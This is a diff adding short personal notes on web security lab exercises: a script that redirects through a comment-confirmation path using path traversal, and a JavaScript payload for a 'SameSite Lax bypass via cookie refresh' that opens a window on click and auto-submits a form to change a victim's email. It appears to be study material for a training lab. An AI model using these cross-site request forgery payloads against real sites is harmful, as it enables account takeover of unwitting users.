@@ -20,3 +20,19 @@ Step2)Make a script like this where it receives redirection
            document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=../my-account";
        </script>
 
+
+--------------------SameSite Lax bypass via cookie refresh------------------------------------
+Step1)Generate Poc with the help of Burp-suite extension
+step2)Use this script
+     <script>
+        window.onclick = () => 
+{
+        window.open('URL');
+        setTimeout(changeemail,5000);
+}
+function changeemail()
+{
+document.form[0].submit();
+}
+     </script>
+Step3)Check for email change
